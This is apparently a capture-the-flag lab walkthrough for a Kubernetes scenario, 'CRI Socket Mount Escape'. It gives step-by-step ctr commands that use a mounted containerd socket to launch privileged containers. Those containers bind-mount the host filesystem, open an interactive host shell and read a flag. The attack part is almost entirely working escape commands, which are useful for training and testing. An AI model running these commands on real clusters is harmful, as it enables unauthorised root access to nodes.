# K8S-16: CRI Socket Mount Escape

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-16 |
| 名称 | CRI Socket Mount Escape |
| 技术/CVE | CRI socket abuse |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |

## 场景概述
- 技术：CRI socket abuse
- 难度：L2
- 交付方式：k8s
## 攻击路径与利用步骤

## Overview
| Property | Value |
|----------|-------|
| CVE/Technique | CRI socket abuse (container runtime socket) |
| Difficulty | L2 |
| Type | k8s (KIND cluster) |
| Cluster Name | cve-k8s-16-cri-socket |
| Flag Location | `/host-flag/flag.txt` on the KIND node (not mounted into the pod; reachable only after escape) |

## Attack Path Summary
1. Pod has `/run/containerd/containerd.sock` mounted via hostPath with `type: Socket`
2. Pod runs as root with `ctr` binary (containerd CLI) installed
3. Use `ctr` to list images available through the host containerd
4. Launch a **privileged** container via the host containerd socket that mounts the host filesystem
5. Read the flag from the escaped container

## Prerequisites
- kubectl access to KIND cluster `cve-k8s-16-cri-socket`
- Pod name: `cri-escape-pod`
- Tools inside pod: `ctr` (containerd CLI), bash

## Step-by-Step Exploitation

### Step 1: Initial Access
The pod `cri-escape-pod` is deployed with the containerd socket mounted. Verify access:

```bash
# Exec into the pod
kubectl exec -it cri-escape-pod -- /bin/bash

# Verify the CRI socket is accessible
ls -la /run/containerd/containerd.sock
# Expected: srw-rw---- 1 root root 0 ... /run/containerd/containerd.sock

# Verify ctr binary is available
which ctr
# Expected: /usr/local/bin/ctr

# Test communication with the containerd daemon
ctr --address /run/containerd/containerd.sock version
# Expected: containerd client/server version info
```

### Step 2: Enumerate Images via Host Containerd
List images available on the host containerd:

```bash
ctr --address /run/containerd/containerd.sock images ls
```

You should see the images currently available on the host (including `cri-escape-pod:local` and any Kubernetes system images).

### Step 3: Launch Privileged Escape Container
Run a privileged container through the host containerd that mounts the host filesystem:

```bash
ctr --address /run/containerd/containerd.sock run --rm \
    --privileged \
    --mount type=bind,src=/host-flag,dst=/mnt,options=rbind:rw \
    docker.io/library/alpine:latest \
    escape \
    cat /mnt/flag.txt
```

**Explanation:**
- `--privileged` grants all capabilities to the new container (no container runtime restrictions)
- The mount bind-maps `/host-flag` from the KIND node (which contains the flag) to `/mnt` inside the new container
- `docker.io/library/alpine:latest` is the image to run (pulled if not cached)
- The command `cat /mnt/flag.txt` reads the flag

If the Alpine image is not cached, pull it first:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/alpine:latest
```

### Step 4: Advanced Escape (Interactive Shell)
For interactive host access instead of a single command:

```bash
ctr --address /run/containerd/containerd.sock run --rm -t \
    --privileged \
    --mount type=bind,src=/,dst=/host,options=rbind:rw \
    docker.io/library/alpine:latest \
    escape \
    /bin/sh
```

From the escape shell:
```bash
cat /host/host-flag/flag.txt
# Or explore the host filesystem at /host/
```

### Step 5: Capture Flag
- Flag format: `flag{k8s-16-*}`
- Flag location: `/host-flag/flag.txt` on the KIND node, accessible as `/mnt/flag.txt` from the escape container
- Expected output: `flag{k8s-16-default}` (or custom value from `CVE_FLAG` env var)

## Verification Commands
```bash
# Verify the scenario is deployed and running
kubectl get pod cri-escape-pod
# Expected: NAME             READY   STATUS    RESTARTS   AGE
#           cri-escape-pod   1/1     Running   0          ...

# Verify CRI socket is mounted
kubectl exec cri-escape-pod -- ls -la /run/containerd/containerd.sock
# Expected: srw-rw---- 1 root root ... /run/containerd/containerd.sock

# Quick exploit verification (single line)
kubectl exec cri-escape-pod -- ctr --address /run/containerd/containerd.sock run --rm --privileged --mount type=bind,src=/host-flag,dst=/mnt,options=rbind:rw docker.io/library/alpine:latest escape cat /mnt/flag.txt
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | CRI gRPC socket, crictl, and node runtime |
| 侦察与前置条件 | Mounted CRI socket discovery and runtime API enumeration |
| 核心漏洞与利用 | Use the CRI socket to create a privileged host-mounted container |
| 权限、横向或影响 | Node/container escape |
| 验证 | Read the host flag through the created container |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
